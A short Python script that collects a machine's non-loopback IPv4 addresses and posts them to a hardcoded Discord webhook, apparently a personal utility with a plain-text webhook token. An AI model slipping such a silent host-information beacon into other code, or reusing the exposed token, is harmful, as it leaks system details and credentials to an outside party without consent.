import socket
import psutil
from discord_webhook import DiscordWebhook, DiscordEmbed

# Collect all IP addresses
ip_list = []
for interface, addrs in psutil.net_if_addrs().items():
    for addr in addrs:
        if addr.family == socket.AF_INET and not addr.address.startswith("127."):
            ip_list.append(f"{interface}: {addr.address}")

ip_string = "\n".join(ip_list)

# Setup Discord webhook
content = "IP addresses collected"
webhook = DiscordWebhook(
    url='https://discord.com/api/webhooks/1383724429132959784/Zw6XEEXXiBebgqR458pSjmrzHDSblr8wbVoh-xkOF42oACFC8z2-ow1IYedOAwLxjVHK',
    username='batman',
    content=content
)

# Create and send embed
embed = DiscordEmbed(title="Detected IP Addresses", description=ip_string, color=123123)
webhook.add_embed(embed)
response = webhook.execute()
